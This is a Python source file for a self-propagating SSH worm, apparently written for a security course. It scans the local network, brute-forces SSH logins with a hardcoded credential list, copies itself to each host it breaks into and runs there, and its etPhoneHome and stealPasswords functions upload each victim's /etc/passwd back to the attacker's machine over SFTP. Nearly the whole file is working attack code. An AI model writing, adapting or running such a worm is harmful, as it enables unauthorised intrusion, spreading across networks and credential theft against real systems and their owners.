import sys
import socket
import paramiko

from Replicator import Replicator

DEBUG = True

NUM_SYSTEMS_TO_INFECT = 1

hostIP = None

try:
	dprint
except:
	def dprint(msg, debug=True):
		if debug:
			print(msg)

def main(argv):

	# The list of credentials to attempt
	credList = [
		('hello', 'world'),
		('hello1', 'world'),
		('root', '#Gig#'),
		('cpsc', 'cpsc'),
	]

	myReplicator = Replicator(credList)
	Replicator.INFECTED_MARKER_FILE = '/tmp/pwthief-infected.txt'
	Replicator.DEBUG_OUTPUT_FILE    = '/tmp/pwthief-output.txt'

	isHost = True

	# Get the IP of the current system
	currentIp = Replicator.getMyIP('eth2')
	dprint("Current IP: " + currentIp, DEBUG)

	# If we are being run without a command line parameters,
	# then we assume we are executing on a victim system and
	# will act maliciously. This way, when you initially run the
	# worm on the origin system, you can simply give it some command
	# line parameters so the worm knows not to act maliciously
	# on attackers system. If you do not like this approach,
	# an alternative approach is to hardcode the origin system's
	# IP address and have the worm check the IP of the current
	# system against the hardcoded IP.
	if len(argv) < 1:

		isHost = False

		dprint("Running on victim system...", DEBUG)

		stealPasswords(hostIP, currentIp)

		myReplicator.markInfected()

	# Mark system as host so future scans won't hit the host
	if isHost:
		Replicator.markAsHost()

	# Get the hosts on the same network
	networkHosts = Replicator.getHostsOnTheSameNetwork()

	# Remove the IP of the current system
	# from the list of discovered systems (we
	# do not want to target ourselves!).
	if currentIp in networkHosts:
		networkHosts.remove(currentIp)

	dprint("Found hosts: %s" % str(networkHosts), DEBUG)

	systemsInfected = 0

	# Go through the network hosts
	for host in networkHosts:

		dprint("### Probing " + host + " ###", DEBUG)

		# Try to attack this host
		sshInfo, sshClient =  myReplicator.attackSystem(host)

		dprint("Final assessment: " + Replicator.desc(sshInfo), DEBUG)

		# Did the attack succeed?
		if sshInfo == Replicator.SUCCESSFUL_CONNECTION:

			# Make sure the remote system is not the host
			if not myReplicator.remoteSystemIsHost():

				# Make sure the remote system is not already infected
				if not myReplicator.remoteSystemIsInfected():

					dprint(host + " is not infected yet", DEBUG)

					myReplicator.spreadAndExecute(isHost, "/tmp/password_thief.py")

					systemsInfected += 1
				else:
					dprint(host + " is already infected", DEBUG)
			else:
				dprint("Remote system is host, cancel the attack", DEBUG)

			dprint("Spreading complete", DEBUG)

			if systemsInfected == NUM_SYSTEMS_TO_INFECT:
				break

	dprint("Finished pwning...", DEBUG)
	sys.exit(0)

def etPhoneHome(hostIP):
	'''
	Establish an SSH connection back to the attacker's system to upload
	the retrieved passwords
	:param hostIP: string
	:return: paramiko.SSHClient
	'''
	baseSystem = paramiko.SSHClient()
	baseSystem.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		# Probably best to hide the attacker's credentials in case of a
		# counter-attack. For now just hardcode it into the worm.
		baseSystem.connect(hostIP, username='cpsc', password='cpsc')
	except:
		return None

	return baseSystem


def stealPasswords(hostIP, currentIP):
	'''
	Retrieve the password file on the victim's system and upload
	back to the attacker
	:param sshClient:
	:param hostIP:
	:return:
	'''
	hostSystem = etPhoneHome(hostIP)
	hostSftp = hostSystem.open_sftp()

	if hostSystem:
		hostSftp.put('/etc/passwd', '/home/cpsc/passwd_' + currentIP)
		hostSftp.close()
		hostSystem.close()

if __name__ == "__main__":
	main(sys.argv[1:])
